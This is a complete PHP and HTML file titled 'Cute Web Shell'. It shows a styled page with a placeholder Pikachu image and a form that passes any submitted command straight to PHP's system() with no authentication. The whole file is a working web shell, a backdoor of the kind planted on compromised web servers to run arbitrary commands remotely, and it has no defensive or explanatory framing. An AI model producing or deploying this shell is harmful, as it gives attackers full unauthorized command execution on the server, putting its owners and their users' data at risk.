<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cute Web Shell</title>
    <style>
        body {
            background-color: #fffbe7;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: flex-start;
            padding: 20px;
        }
        .image-container {
            margin-right: 30px;
        }
        img {
            width: 200px;
            border-radius: 12px;
            box-shadow: 2px 2px 8px rgba(0,0,0,0.2);
        }
        .shell-container {
            flex-grow: 1;
        }
        textarea, button {
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-family: monospace;
            font-size: 14px;
        }
        pre {
            background-color: #f3f3f3;
            padding: 10px;
            border-radius: 5px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="data:image/png;base64,{{BASE64_PIKACHU_IMAGE_HERE}}">
    </div>
    <div class="shell-container">
        <form method="POST">
            <textarea name="cmd" rows="5" placeholder="Enter your command..."></textarea>
            <button type="submit">Execute</button>
        </form>
        <pre>
<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    system($cmd);
}
?>
        </pre>
    </div>
    <script>
        // Submit form when pressing Enter + Shift
        document.querySelector('textarea').addEventListener('keydown', function (e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                this.form.submit();
            }
        });
    </script>
</body>
</html>
